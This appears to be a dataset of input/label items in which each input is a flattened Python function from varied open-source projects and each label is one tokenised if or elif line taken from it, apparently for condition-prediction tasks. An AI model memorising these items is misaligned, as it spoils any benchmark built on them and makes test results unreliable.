{"input": "def _remove_custom_marker_object_instances(self): for id, obj in list(self._objects.items()): if isinstance(obj, objects.CustomObject): logger.info(\"Removing CustomObject instance: id %s = obj '%s'\", id, obj) del self._objects[id]", "label": "if isinstance ( obj , objects . CustomObject ) :"}
{"input": "def append(self, labels): if isinstance(labels, list): for label in labels: if not label in self.__menuLabels: self.__menuLabels.append(label) self.__enabledLabels.append(label) else: if not labels in self.__menuLabels: self.__menuLabels.append(labels) self.__enabledLabels.append(labels)", "label": "if not label in self . __menuLabels :"}
{"input": "def _close_tree(view: View, defx: Defx, context: Context) -> None: for target in context.targets: if target[\"is_directory\"] and target[\"is_opened_tree\"]: view.close_tree(target[\"action__path\"], defx._index) else: view.close_tree(target[\"action__path\"].parent, defx._index) view.search_file(target[\"action__path\"].parent, defx._index)", "label": "if target [ \"is_directory\" ] and target [ \"is_opened_tree\" ] :"}
{"input": "def FirstFetch(self): q = collections.deque([\"buddy\", \"group\", \"discuss\"]) while q: tinfo = q.popleft() if self.Update(tinfo) and tinfo in (\"group\", \"discuss\"): cl = self.List(tinfo) if cl: q.extend(cl) time.sleep(1.0)", "label": "if self . Update ( tinfo ) and tinfo in ( \"group\" , \"discuss\" ) :"}
{"input": "def _sort_values_jobconf(self): \"\"\"Jobconf dictionary to enable sorting by value.\"\"\" if not self._sort_values: return {} # translate _SORT_VALUES_JOBCONF to the correct Hadoop version, # without logging a warning hadoop_version = self.get_hadoop_version() jobconf = {} for k, v in _SORT_VALUES_JOBCONF.items(): if hadoop_version: jobconf[translate_jobconf(k, hadoop_version)] = v else: for j in translate_jobconf_for_all_versions(k): jobconf[j] = v return jobconf", "label": "if hadoop_version :"}
{"input": "def list(self): for fname in os.listdir(self.path): fpath = os.path.join(self.path, fname) if os.path.isfile(fpath) and fname.endswith(self.fileext): yield fname, get_etag_from_file(fpath)", "label": "if os . path . isfile ( fpath ) and fname . endswith ( self . fileext ) :"}
{"input": "def get_environment_variable_value(val): env_val = val if val is not None and isinstance(val, str): match = re.search(r\"^\\${(?P<environment_key_name>\\w+)*}$\", val) if match is not None: env_val = os.environ.get(match.group(\"environment_key_name\")) return env_val", "label": "if match is not None :"}
{"input": "def L_op(self, inputs, outputs, grads): (x,) = inputs (gz,) = grads if x.type in complex_types: raise NotImplementedError() if outputs[0].type in discrete_types: if x.type in discrete_types: return [x.zeros_like(dtype=theano.config.floatX)] else: return [x.zeros_like()] cst = np.asarray(np.sqrt(np.pi) / 2.0, dtype=upcast(x.type.dtype, gz.type.dtype)) return (gz * cst * exp(erfinv(x) ** 2),)", "label": "if x . type in discrete_types :"}
{"input": "def is_test_finished(self): retcode = self.process.poll() if retcode is not None: logger.info(\"Phantom done its work with exit code: %s\", retcode) self.phout_finished.set() return abs(retcode) else: info = self.get_info() if info: eta = int(info.duration) - (int(time.time()) - int(self.start_time)) self.publish(\"eta\", eta) return -1", "label": "if info :"}
{"input": "def icon(display_icon): \"\"\"returns empty dict if show_icons is False, else the icon passed\"\"\" kws = {} if get_icon_switch(): if display_icon.startswith(\"SV_\"): kws = {\"icon_value\": custom_icon(display_icon)} elif display_icon != \"OUTLINER_OB_EMPTY\": kws = {\"icon\": display_icon} return kws", "label": "if display_icon . startswith ( \"SV_\" ) :"}
{"input": "def raise_to_cubic(bzs): result = [] for sp in bzs: r = [] for bz in sp: if len(bz) == 3: r.append( ( bz[0], lerppt(2.0 / 3, bz[0], bz[1]), lerppt(2.0 / 3, bz[2], bz[1]), bz[2], ) ) else: r.append(bz) result.append(r) return result", "label": "if len ( bz ) == 3 :"}
{"input": "def readline(self): while 1: line = self._readline() if line: self._filelineno += 1 return line if not self._file: return line self.nextfile()", "label": "if not self . _file :"}
{"input": "def readlines(self): \"\"\"Returns a list of all lines (optionally parsed) in the file.\"\"\" if self.grammar: tot = [] # Used this way instead of a 'for' loop against # self.file.readlines() so that there wasn't two copies of the file # in memory. while 1: line = self.file.readline() if not line: break tot.append(line) return tot return self.file.readlines()", "label": "if not line :"}
{"input": "def visit_return(self, node): # TODO: pythoncile.py handled (a) spliting CITDL (scoperef), (b) # excluding \"None\" and \"NoneType\", (c) True/False -> bool. # pythoncile.py also gather all return's and picked the most # common guess. # TODO:XXX Evaluate the necessity of multiple return statement analysis. scope = self._peek_scope() assert scope.ilk == \"function\" if not scope.get(\"returns\"): citdl = self._citdl_from_node(node.children[1]) if citdl and citdl is not \"None\": scope.attrs[\"returns\"] = citdl", "label": "if citdl and citdl is not \"None\" :"}
{"input": "def load_json_file(file_path): \"\"\"load a file into a json object\"\"\" try: with open(file_path) as small_file: return json.load(small_file) except OSError as e: print(e) print(\"trying to read file in blocks\") with open(file_path) as big_file: json_string = \"\" while True: block = big_file.read(64 * (1 << 20)) # Read 64 MB at a time; json_string = json_string + block if not block: # Reached EOF break return json.loads(json_string)", "label": "if not block :"}
{"input": "def rotate(cls, axis, theta): \"\"\"Prepare a quaternion that represents a rotation on a given axis.\"\"\" if isinstance(axis, str): if axis in (\"x\", \"X\"): axis = V.X elif axis in (\"y\", \"Y\"): axis = V.Y elif axis in (\"z\", \"Z\"): axis = V.Z axis = axis.normalize() s = math.sin(theta / 2.0) c = math.cos(theta / 2.0) return Q(axis._v[0] * s, axis._v[1] * s, axis._v[2] * s, c)", "label": "elif axis in ( \"y\" , \"Y\" ) :"}
{"input": "def is_valid_block(self): \"\"\"check wheter the block is valid in the current position\"\"\" for i in range(self.block.x): for j in range(self.block.x): if self.block.get(i, j): if self.block.pos.x + i < 0: return False if self.block.pos.x + i >= COLUMNS: return False if self.block.pos.y + j < 0: return False if self.map.get((self.block.pos.x + i, self.block.pos.y + j), False): return False return True", "label": "if self . block . pos . y + j < 0 :"}
{"input": "def dump_token_list(tokens): for token in tokens: if token.token_type == TOKEN_TEXT: writer.write(token.contents) elif token.token_type == TOKEN_VAR: writer.print_expr(token.contents) touch_var(token.contents)", "label": "elif token . token_type == TOKEN_VAR :"}
{"input": "def encode(name, value): try: if parametrized.is_parametrized(name, value): value, params = value return _encode_parametrized(name, value, params) return _encode_unstructured(name, value) except Exception: _log.exception(\"Failed to encode %s %s\" % (name, value)) raise", "label": "if parametrized . is_parametrized ( name , value ) :"}
{"input": "def conversation_to_fb_format(conversation): assert len(conversation) > 1 lines = [] for i in range(0, len(conversation), 2): if i + 1 < len(conversation): lines.append( \"%d %s\\t%s\" % (i / 2 + 1, conversation[i], conversation[i + 1]) ) else: lines.append(\"%d %s\" % (i / 2 + 1, conversation[i])) return \"\\n\".join(lines)", "label": "if i + 1 < len ( conversation ) :"}
{"input": "def _handle_js_events(self, change): if self.js_events: if self.event_handlers: for event in self.js_events: event_name = event[\"name\"] if event_name in self.event_handlers: self.event_handlers[event_name](event[\"detail\"]) # clears the event queue. self.js_events = []", "label": "if self . event_handlers :"}
{"input": "def escapeall(self, lines): \"Escape all lines in an array according to the output options.\" result = [] for line in lines: if Options.html: line = self.escape(line, EscapeConfig.html) if Options.iso885915: line = self.escape(line, EscapeConfig.iso885915) line = self.escapeentities(line) elif not Options.unicode: line = self.escape(line, EscapeConfig.nonunicode) result.append(line) return result", "label": "elif not Options . unicode :"}
{"input": "def filter_testsuite(suite, matcher, level=None): \"\"\"Returns a flattened list of test cases that match the given matcher.\"\"\" if not isinstance(suite, unittest.TestSuite): raise TypeError(\"not a TestSuite\", suite) results = [] for test in suite._tests: if level is not None and getattr(test, \"level\", 0) > level: continue if isinstance(test, unittest.TestCase): testname = test.id() # package.module.class.method if matcher(testname): results.append(test) else: filtered = filter_testsuite(test, matcher, level) results.extend(filtered) return results", "label": "if matcher ( testname ) :"}
{"input": "def _close_brackets(self, fragment): # If there any unclosed brackets in the text we try to close them # and we return part with closing brackets if they are \"closable\" stack = [] for char in fragment: if char in self._PARENS.keys(): stack.append(char) elif char in self._PARENS.values(): if stack and self._PARENS[stack[-1]] == char: stack.pop() else: return \"\" return \"\".join(self._PARENS[paren] for paren in reversed(stack))", "label": "elif char in self . _PARENS . values ( ) :"}
{"input": "def restrict(points): result = [] for p in points: if point_inside_mesh(bvh, p): result.append(p) else: loc, normal, index, distance = bvh.find_nearest(p) if loc is not None: result.append(tuple(loc)) return result", "label": "if loc is not None :"}
{"input": "def _check_ids(el, filename, parent_id): \"\"\"Recursively walks through tree and check if every object has ID\"\"\" for child in el: if child.tag == \"object\": msg = \"Widget has no ID in %s; class %s; Parent id: %s\" % ( filename, child.attrib[\"class\"], parent_id, ) assert \"id\" in child.attrib and child.attrib[\"id\"], msg for subel in child: if subel.tag == \"child\": _check_ids(subel, filename, child.attrib[\"id\"])", "label": "if subel . tag == \"child\" :"}
{"input": "def _checkIfSuccessfulCallback(self, result, error=False, **kwargs): if error: connection_error = kwargs.get(\"connection_error\", False) if connection_error: log.debug( \"During direct file upload compute is not visible. Fallback to upload via controller.\" ) # there was an issue with connection, probably we don't have a direct access to compute # we need to fallback to uploading files via controller self._fileUploadToController() else: if \"message\" in result: log.error( \"Error while direct file upload: {}\".format(result[\"message\"]) ) return self._callback(result, error, **kwargs)", "label": "if connection_error :"}
{"input": "def getCellPropertyNames_aux(self, col_id): if col_id == \"name\": if self.image_icon == \"places_busy\": return [\"places_busy\"] baseName = self.image_icon if self.isOpen: return [baseName + \"_open\"] else: return [baseName + \"_closed\"] return []", "label": "if self . image_icon == \"places_busy\" :"}
{"input": "def delete_volume(self, volume_id): if volume_id in self.volumes: volume = self.volumes[volume_id] if volume.attachment: raise VolumeInUseError(volume_id, volume.attachment.instance.id) return self.volumes.pop(volume_id) raise InvalidVolumeIdError(volume_id)", "label": "if volume . attachment :"}
{"input": "def dashboards(self): dashboards = OrderedDict() for slug, path in enumerate(app_settings.DASHBOARDS): if isinstance(path, (list, tuple)): slug, path = path pk = str(slug) klass = import_string(path) dashboards[pk] = klass(pk=pk) if not dashboards: raise ImproperlyConfigured(\"No dashboards found.\") return dashboards", "label": "if isinstance ( path , ( list , tuple ) ) :"}
{"input": "def test_reader(config, device, logger): loader = build_dataloader(config, \"Train\", device, logger) import time starttime = time.time() count = 0 try: for data in loader(): count += 1 if count % 1 == 0: batch_time = time.time() - starttime starttime = time.time() logger.info( \"reader: {}, {}, {}\".format(count, len(data[0]), batch_time) ) except Exception as e: logger.info(e) logger.info(\"finish reader: {}, Success!\".format(count))", "label": "if count % 1 == 0 :"}
{"input": "def on_adapter_selected(self, menuitem, adapter_path): if menuitem.props.active: if adapter_path != self.blueman.List.Adapter.get_object_path(): logging.info(\"selected %s\", adapter_path) self.blueman.Config[\"last-adapter\"] = adapter_path_to_name(adapter_path) self.blueman.List.set_adapter(adapter_path)", "label": "if adapter_path != self . blueman . List . Adapter . get_object_path ( ) :"}
{"input": "def set_note_pinned(self, key, pinned): n = self.notes[key] old_pinned = utils.note_pinned(n) if pinned != old_pinned: if \"systemtags\" not in n: n[\"systemtags\"] = [] systemtags = n[\"systemtags\"] if pinned: # which by definition means that it was NOT pinned systemtags.append(\"pinned\") else: systemtags.remove(\"pinned\") n[\"modifydate\"] = time.time() self.notify_observers( \"change:note-status\", events.NoteStatusChangedEvent(what=\"modifydate\", key=key), )", "label": "if \"systemtags\" not in n :"}
{"input": "def setMinCores(self, rpcObjects=None): tasks = self._getSelected(rpcObjects) if tasks: current = max([task.data.min_cores for task in tasks]) title = \"Set Minimum Cores\" body = \"Please enter the new minimum cores value:\" (value, choice) = QtWidgets.QInputDialog.getDouble( self._caller, title, body, current, 0, 50000, 0 ) if choice: for task in tasks: task.setMinCores(float(value)) self._update()", "label": "if choice :"}
{"input": "def _1_0_cloud_ips_cip_jsjc5(self, method, url, body, headers): if method == \"DELETE\": return self.test_response(httplib.OK, \"\") elif method == \"PUT\": body = json.loads(body) if body.get(\"reverse_dns\", None) == \"fred.co.uk\": return self.test_response(httplib.OK, \"\") else: return self.test_response( httplib.BAD_REQUEST, '{\"error_name\":\"bad dns\", \"errors\": [\"Bad dns\"]}' )", "label": "if body . get ( \"reverse_dns\" , None ) == \"fred.co.uk\" :"}
{"input": "def _print_one_entry(news_entry: xml.etree.ElementTree.Element) -> None: child: xml.etree.ElementTree.Element for child in news_entry: if \"title\" in child.tag: title = str(child.text) if \"pubDate\" in child.tag: pub_date = str(child.text) if \"description\" in child.tag: description = str(child.text) print_stdout(color_line(title, 14) + \" (\" + bold_line(pub_date) + \")\") print_stdout(format_paragraph(strip_tags(description))) print_stdout()", "label": "if \"pubDate\" in child . tag :"}
{"input": "def oregon_battery(self, offset): nib = self.decoded_nibbles batt = \"OK\" if nib[offset][3] != \"\": if (int(nib[offset][3], 16) >> 2) & 0x1 == 1: batt = \"Low\" self.put( nib[offset][0], nib[offset][1], self.out_ann, [2, [\"Batt \" + batt, batt]] )", "label": "if ( int ( nib [ offset ] [ 3 ] , 16 ) >> 2 ) & 0x1 == 1 :"}
{"input": "def body_stream() -> typing.AsyncGenerator[bytes, None]: while True: message = await queue.get() if message is None: break assert message[\"type\"] == \"http.response.body\" yield message.get(\"body\", b\"\") task.result()", "label": "if message is None :"}
{"input": "def _wait_for_reboot(): try: state = self._conn.reboot_domain(instance[\"name\"]) if state == power_state.RUNNING: LOG.debug(_(\"instance %s: rebooted\"), instance[\"name\"]) timer.stop() except Exception: LOG.exception(_(\"_wait_for_reboot failed\")) timer.stop()", "label": "if state == power_state . RUNNING :"}
{"input": "def _get_sequence_vector( sequence, tokenizer, format_dtype, unit_to_id, lowercase=True, unknown_symbol=UNKNOWN_SYMBOL, ): unit_sequence = tokenizer(sequence.lower() if lowercase else sequence) unit_indices_vector = np.empty(len(unit_sequence), dtype=format_dtype) for i in range(len(unit_sequence)): curr_unit = unit_sequence[i] if curr_unit in unit_to_id: unit_indices_vector[i] = unit_to_id[curr_unit] else: unit_indices_vector[i] = unit_to_id[unknown_symbol] return unit_indices_vector", "label": "if curr_unit in unit_to_id :"}
{"input": "def forward(self, x: Tensor, edge_index: Adj) -> Tensor: \"\"\"\"\"\" if self.add_self_loops: if isinstance(edge_index, Tensor): edge_index, _ = remove_self_loops(edge_index) edge_index, _ = add_self_loops(edge_index, num_nodes=x.size(self.node_dim)) elif isinstance(edge_index, SparseTensor): edge_index = set_diag(edge_index) x_norm = F.normalize(x, p=2.0, dim=-1) # propagate_type: (x: Tensor, x_norm: Tensor) return self.propagate(edge_index, x=x, x_norm=x_norm, size=None)", "label": "elif isinstance ( edge_index , SparseTensor ) :"}
{"input": "def _init_req_settings(self, **kwargs): for req_attr in self._req_settings: req_attr_value = kwargs.get(req_attr) if req_attr_value is None: raise MissingRequiredConf(conf_name=req_attr_value) # Validate attribute value req_attr_value = get_validator(req_attr)(req_attr_value) self._settings[req_attr] = req_attr_value", "label": "if req_attr_value is None :"}
{"input": "def delete(identifier, filenames=None, **kwargs): item = get_item(identifier) if filenames: if not isinstance(filenames, (set, list)): filenames = [filenames] for f in item.iter_files(): if f.name not in filenames: continue f.delete(**kwargs)", "label": "if f . name not in filenames :"}
{"input": "def visit_decorator(self, o: Decorator) -> None: if self.is_private_name(o.func.name, o.func.fullname): return is_abstract = False for decorator in o.original_decorators: if isinstance(decorator, NameExpr): if self.process_name_expr_decorator(decorator, o): is_abstract = True elif isinstance(decorator, MemberExpr): if self.process_member_expr_decorator(decorator, o): is_abstract = True self.visit_func_def(o.func, is_abstract=is_abstract)", "label": "if self . process_member_expr_decorator ( decorator , o ) :"}
{"input": "def split_trading_pair(trading_pair: str) -> Optional[Tuple[str, str]]: try: m = RE_4_LETTERS_QUOTE.match(trading_pair) if m is None: m = RE_3_LETTERS_QUOTE.match(trading_pair) if m is None: m = RE_2_LETTERS_QUOTE.match(trading_pair) return m.group(1), m.group(2) # Exceptions are now logged as warnings in trading pair fetcher except Exception: return None", "label": "if m is None :"}
{"input": "def traverse_states(root): todo = [root] model = self.model while len(todo): iter = todo.pop(0) # print model.value_path(iter, treeindex), model.get_state(iter, treeindex) yield model.get_state(iter, treeindex) path = model.get_path(iter) if treeview.row_expanded(path): children = [] child = model.iter_children(iter) while child: children.append(child) child = model.iter_next(child) todo = children + todo yield None # end marker", "label": "if treeview . row_expanded ( path ) :"}
{"input": "def as_list( self, compact=True, storage_to_dict=True, datetime_to_str=False, custom_types=None ): if storage_to_dict: items = [] for row in self: item = row.as_dict(datetime_to_str, custom_types) for jdata in self._joins_: if not jdata[2]: item[jdata[0]] = row[jdata[0]].as_list() items.append(item) else: items = [item for item in self] return items", "label": "if not jdata [ 2 ] :"}
{"input": "def zip(target, source, env): compression = env.get(\"ZIPCOMPRESSION\", 0) zf = zipfile.ZipFile(str(target[0]), \"w\", compression) for s in source: if s.isdir(): for dirpath, dirnames, filenames in os.walk(str(s)): for fname in filenames: path = os.path.join(dirpath, fname) if os.path.isfile(path): zf.write(path) else: zf.write(str(s)) zf.close()", "label": "if os . path . isfile ( path ) :"}
{"input": "def remove_PBA_files(): if monkey_island.cc.services.config.ConfigService.get_config(): windows_filename = ( monkey_island.cc.services.config.ConfigService.get_config_value( PBA_WINDOWS_FILENAME_PATH ) ) linux_filename = ( monkey_island.cc.services.config.ConfigService.get_config_value( PBA_LINUX_FILENAME_PATH ) ) if linux_filename: remove_file(linux_filename) if windows_filename: remove_file(windows_filename)", "label": "if windows_filename :"}
{"input": "def test_takewhile(self): for s in (range(10), range(0), range(1000), (7, 11), range(2000, 2200, 5)): for g in (G, I, Ig, S, L, R): tgt = [] for elem in g(s): if not isEven(elem): break tgt.append(elem) self.assertEqual(list(takewhile(isEven, g(s))), tgt) self.assertRaises(TypeError, takewhile, isEven, X(s)) self.assertRaises(TypeError, takewhile, isEven, N(s)) self.assertRaises(ZeroDivisionError, list, takewhile(isEven, E(s)))", "label": "if not isEven ( elem ) :"}
{"input": "def find_defined_variables(board_config_mks): re_def = re.compile(\"^[\\s]*([\\w\\d_]*)[\\s]*:=\") variables = dict() for board_config_mk in board_config_mks: for line in open(board_config_mk, encoding=\"latin1\"): mo = re_def.search(line) if mo is None: continue variable = mo.group(1) if variable in white_list: continue if variable not in variables: variables[variable] = set() variables[variable].add(board_config_mk[len(TOP) + 1 :]) return variables", "label": "if variable not in variables :"}
{"input": "def download_file(url, file): try: xlog.info(\"download %s to %s\", url, file) opener = get_opener() req = opener.open(url, cafile=\"\") CHUNK = 16 * 1024 with open(file, \"wb\") as fp: while True: chunk = req.read(CHUNK) if not chunk: break fp.write(chunk) return True except: xlog.info(\"download %s to %s fail\", url, file) return False", "label": "if not chunk :"}
{"input": "def set_preferred_lane(self, preferred_lane: int = None) -> \"AbstractEnv\": env_copy = copy.deepcopy(self) if preferred_lane: for v in env_copy.road.vehicles: if isinstance(v, IDMVehicle): v.route = [(lane[0], lane[1], preferred_lane) for lane in v.route] # Vehicle with lane preference are also less cautious v.LANE_CHANGE_MAX_BRAKING_IMPOSED = 1000 return env_copy", "label": "if isinstance ( v , IDMVehicle ) :"}
{"input": "def resolve(self, value: Optional[T]) -> T: v: Optional[Any] = value if value is None: t = os.environ.get(self.envvar) if self.type is bool and t: v = t in [\"true\", \"True\", \"1\", \"yes\"] elif self.type is str and t: v = t elif t: v = ast.literal_eval(t) if t is not None else None if v is None: v = self.default return v", "label": "elif self . type is str and t :"}
{"input": "def test_read_lazy_A(self): want = [\"x\" * 100, EOF_sigil] self.dataq.put(want) telnet = telnetlib.Telnet(HOST, self.port) self.dataq.join() time.sleep(self.block_short) self.assertEqual(\"\", telnet.read_lazy()) data = \"\" while True: try: read_data = telnet.read_lazy() data += read_data if not read_data: telnet.fill_rawq() except EOFError: break self.assertTrue(want[0].startswith(data)) self.assertEqual(data, want[0])", "label": "if not read_data :"}
{"input": "def request_put_json(url, headers): \"\"\"Makes a PUT request and returns the JSON response\"\"\" try: response = requests.put(url, headers=headers) if response.status_code == 200: return response.json() else: raise RadarrRequestError( \"Invalid response received from Radarr: %s\" % response.content ) except RequestException as e: raise RadarrRequestError( \"Unable to connect to Radarr at %s. Error: %s\" % (url, e) )", "label": "if response . status_code == 200 :"}
{"input": "def firebase_analysis(urls): # Detect Firebase URL firebase_db = [] logger.info(\"Detecting Firebase URL(s)\") for url in urls: if \"firebaseio.com\" in url: returl, is_open = open_firebase(url) fbdic = {\"url\": returl, \"open\": is_open} if fbdic not in firebase_db: firebase_db.append(fbdic) return firebase_db", "label": "if \"firebaseio.com\" in url :"}
{"input": "def logprob(self, sample): if self._log: return self._prob_dict.get(sample, _NINF) else: if sample not in self._prob_dict: return _NINF elif self._prob_dict[sample] == 0: return _NINF else: return math.log(self._prob_dict[sample], 2)", "label": "if sample not in self . _prob_dict :"}
{"input": "def is_image(self, input): try: if isinstance(input, (np.ndarray, Image.Image)): return True elif isinstance(input, str): if not os.path.isfile(input): raise ValueError(\"input must be a file\") img = Image.open(input) _ = img.size return True else: return False except: return False", "label": "if isinstance ( input , ( np . ndarray , Image . Image ) ) :"}
{"input": "def extract(self): for battery in self.vars: for line in dopen(\"/proc/acpi/battery/\" + battery + \"/state\").readlines(): l = line.split() if len(l) < 3: continue if l[0:2] == [\"remaining\", \"capacity:\"]: remaining = int(l[2]) continue elif l[0:2] == [\"present\", \"rate:\"]: rate = int(l[2]) continue if rate and remaining: self.val[battery] = remaining * 60 / rate else: self.val[battery] = -1", "label": "elif l [ 0 : 2 ] == [ \"present\" , \"rate:\" ] :"}
{"input": "def get_app_module(module_name, raise_on_failure=True): try: __import__(module_name) except ImportError: if sys.exc_info()[-1].tb_next: raise RuntimeError( f\"While importing '{module_name}', an ImportError was raised:\" f\"\\n\\n{traceback.format_exc()}\" ) elif raise_on_failure: raise RuntimeError(f\"Could not import '{module_name}'.\") else: return return sys.modules[module_name]", "label": "elif raise_on_failure :"}
{"input": "def process_shutdown_hooks(self): for plugin_name in self.DISCOVERED.keys(): try: package = \"mailpile.plugins.%s\" % plugin_name _, manifest = self.DISCOVERED[plugin_name] if package in sys.modules: for method_name in self._mf_path(manifest, \"lifecycle\", \"shutdown\"): method = self._get_method(package, method_name) method(self.config) except: # ignore exceptions here as mailpile is going to shut down traceback.print_exc(file=sys.stderr)", "label": "if package in sys . modules :"}
{"input": "def _check_arch(self, arch): if arch is None: return try: from pycuda.driver import Context capability = Context.get_device().compute_capability() if tuple(map(int, tuple(arch.split(\"_\")[1]))) > capability: from warnings import warn warn( \"trying to compile for a compute capability \" \"higher than selected GPU\" ) except Exception: pass", "label": "if tuple ( map ( int , tuple ( arch . split ( \"_\" ) [ 1 ] ) ) ) > capability :"}
{"input": "def phpinfo_ext(content): indexes = SubstrFind(content, \"AbracadabrA\") found = len(indexes) > 0 got = \"\" if found: start = indexes[0] + 11 for x in range(start, len(content)): if content[x] == \"<\": break got += content[x] return got", "label": "if content [ x ] == \"<\" :"}
{"input": "def update_leaderboard(wait_time): conn = get_connection() cursor = conn.cursor(MySQLdb.cursors.DictCursor) while True: try: if use_log: log.info(\"Updating leaderboard and adding some sigma\") cursor.execute(\"call generate_leaderboard;\") if wait_time == 0: break for s in range(wait_time): # allow for a [Ctrl]+C during the sleep cycle time.sleep(1) except KeyboardInterrupt: break except: # log error log.error(traceback.format_exc()) break cursor.close() conn.close()", "label": "if wait_time == 0 :"}
{"input": "def writeBit(self, state, endian): if self._bit_pos == 7: self._bit_pos = 0 if state: if endian is BIG_ENDIAN: self._byte |= 1 else: self._byte |= 128 self._output.write(chr(self._byte)) self._byte = 0 else: if state: if endian is BIG_ENDIAN: self._byte |= 1 << self._bit_pos else: self._byte |= 1 << (7 - self._bit_pos) self._bit_pos += 1", "label": "if state :"}
{"input": "def getreportopt(config): reportopts = \"\" reportchars = config.option.reportchars if not config.option.disablepytestwarnings and \"w\" not in reportchars: reportchars += \"w\" elif config.option.disablepytestwarnings and \"w\" in reportchars: reportchars = reportchars.replace(\"w\", \"\") if reportchars: for char in reportchars: if char not in reportopts and char != \"a\": reportopts += char elif char == \"a\": reportopts = \"fEsxXw\" return reportopts", "label": "if char not in reportopts and char != \"a\" :"}
{"input": "def validate_module(self, pipeline): if self.mode == MODE_UNTANGLE: if self.training_set_directory.dir_choice != URL_FOLDER_NAME: path = os.path.join( self.training_set_directory.get_absolute_path(), self.training_set_file_name.value, ) if not os.path.exists(path): raise ValidationError( \"Can't find file %s\" % self.training_set_file_name.value, self.training_set_file_name, )", "label": "if self . training_set_directory . dir_choice != URL_FOLDER_NAME :"}
{"input": "def reshape(w, h): try: # Prevent a division by zero when minimising the window if h == 0: h = 1 # Set the drawable region of the window glViewport(0, 0, w, h) # set up the projection matrix glMatrixMode(GL_PROJECTION) glLoadIdentity() # go back to modelview matrix so we can move the objects about glMatrixMode(GL_MODELVIEW) updatePickingBuffer() except Exception: log.error(\"gl.reshape\", exc_info=True)", "label": "if h == 0 :"}
{"input": "def __setitem__(self, key, value): if not isinstance(value, PseudoNamespace): tuple_converted = False if isinstance(value, dict): value = PseudoNamespace(value) elif isinstance(value, tuple): value = list(value) tuple_converted = True if isinstance(value, list): for i, item in enumerate(value): if isinstance(item, dict) and not isinstance(item, PseudoNamespace): value[i] = PseudoNamespace(item) if tuple_converted: value = tuple(value) super(PseudoNamespace, self).__setitem__(key, value)", "label": "if isinstance ( value , dict ) :"}
{"input": "def scan_search(state): delim = state.source[state.position - 1] while True: c = state.consume() if c == delim: state.start += 1 state.backup() content = state.emit() state.consume() token = TokenSearchForward if c == \"/\" else TokenSearchBackward return scan_range, [token(content)] elif c == EOF: raise ValueError(\"unclosed search pattern: {0}\".format(state.source))", "label": "elif c == EOF :"}
{"input": "def fromVariant(variant): if hasattr(QtCore, \"QVariant\") and isinstance(variant, QtCore.QVariant): t = variant.type() if t == QtCore.QVariant.String: return str(variant.toString()) elif t == QtCore.QVariant.Double: return variant.toDouble()[0] elif t == QtCore.QVariant.Int: return variant.toInt()[0] elif t == QtCore.QVariant.Bool: return variant.toBool() elif t == QtCore.QVariant.Invalid: return None else: raise ValueError('Unsupported QVariant type \"%s\"' % variant.typeName()) else: return variant", "label": "elif t == QtCore . QVariant . Invalid :"}
{"input": "def __iter__(self): i = 0 for category, filename in list(self.input_files.items()): for line in open(filename): line = self._clean_line(line) if self.accept_criteria(i): yield Opinion(line, category) i += 1 if i % 1000 == 0: print(\"\\tReaded {} examples\".format(i))", "label": "if i % 1000 == 0 :"}
{"input": "def test_listing_all_frameworks_and_check_frameworks_by_order(self): \"\"\"List all frameworks and check if frameworks appear by order\"\"\" result = subprocess.check_output(self.command_as_list([UMAKE, \"--list\"])) previous_framework = None for element in result.split(b\"\\n\"): if element.startswith(b\"\\t\"): current_framework = element[: element.find(b\":\")] if previous_framework: self.assertTrue(previous_framework < current_framework) previous_framework = current_framework else: previous_framework = None", "label": "if element . startswith ( b\"\\t\" ) :"}
{"input": "def _locate_code(self, event): if self._current_code_view is None: return iid = self.tree.focus() if iid != \"\": values = self.tree.item(iid)[\"values\"] if isinstance(values, list) and len(values) >= 5: start_line, start_col, end_line, end_col = values[1:5] self._current_code_view.select_range( TextRange(start_line, start_col, end_line, end_col) )", "label": "if isinstance ( values , list ) and len ( values ) >= 5 :"}
{"input": "def __setattr__(self, attr, value): \"\"\"Provides additional checks on recipient fields.\"\"\" if attr in [\"to\", \"cc\", \"bcc\"]: if isinstance(value, basestring): if value == \"\" and getattr(self, \"ALLOW_BLANK_EMAIL\", False): return check_email_valid(value, attr) else: for address in value: check_email_valid(address, attr) elif attr == \"headers\": check_headers_valid(value) super(EmailMessage, self).__setattr__(attr, value)", "label": "if value == \"\" and getattr ( self , \"ALLOW_BLANK_EMAIL\" , False ) :"}
{"input": "def _scanDirectory(self, dirIter, f): while len(f) < 250: try: info = next(dirIter) except StopIteration: if not f: raise EOFError return f if isinstance(info, defer.Deferred): info.addCallback(self._cbScanDirectory, dirIter, f) return else: f.append(info) return f", "label": "if isinstance ( info , defer . Deferred ) :"}
{"input": "def iterator(): try: while True: yield from pullparser.read_events() # load event buffer data = source.read(16 * 1024) if not data: break pullparser.feed(data) root = pullparser._close_and_return_root() yield from pullparser.read_events() it.root = root finally: if close_source: source.close()", "label": "if close_source :"}
{"input": "def test_until_timeout(self): timer = TestTimer(self.timeout) while not timer.is_timed_out(): if self.all_analyzers_pass(): self.log_success(timer) return sleep(DELAY_BETWEEN_ANALYSIS) LOGGER.debug( \"Waiting until all analyzers passed. Time passed: {}\".format( timer.get_time_taken() ) ) self.log_failure(timer) assert False", "label": "if self . all_analyzers_pass ( ) :"}
{"input": "def start(self): \"\"\"Start our callback in its own perpetual timer thread.\"\"\" if self.frequency > 0: threadname = self.name or self.__class__.__name__ if self.thread is None: self.thread = PerpetualTimer(self.frequency, self.callback) self.thread.bus = self.bus self.thread.setName(threadname) self.thread.start() self.bus.log(\"Started monitor thread %r.\" % threadname) else: self.bus.log(\"Monitor thread %r already started.\" % threadname)", "label": "if self . thread is None :"}
{"input": "def set_flavour(flavour, request=None, permanent=False): if flavour not in settings.FLAVOURS: raise ValueError( u\"'%r' is no valid flavour. Allowed flavours are: %s\" % ( flavour, \", \".join(settings.FLAVOURS), ) ) request = request or getattr(_local, \"request\", None) if request: request.flavour = flavour if permanent: flavour_storage.set(request, flavour) elif permanent: raise ValueError(u\"Cannot set flavour permanently, no request available.\") _local.flavour = flavour", "label": "if permanent :"}
{"input": "def get_images(image_path, support_ext=\".jpg|.jpeg|.png\"): if not os.path.exists(image_path): raise Exception(f\"Image path {image_path} invalid\") if os.path.isfile(image_path): return [image_path] imgs = [] for item in os.listdir(image_path): ext = os.path.splitext(item)[1][1:].strip().lower() if len(ext) > 0 and ext in support_ext: item_path = os.path.join(image_path, item) imgs.append(item_path) return imgs", "label": "if len ( ext ) > 0 and ext in support_ext :"}
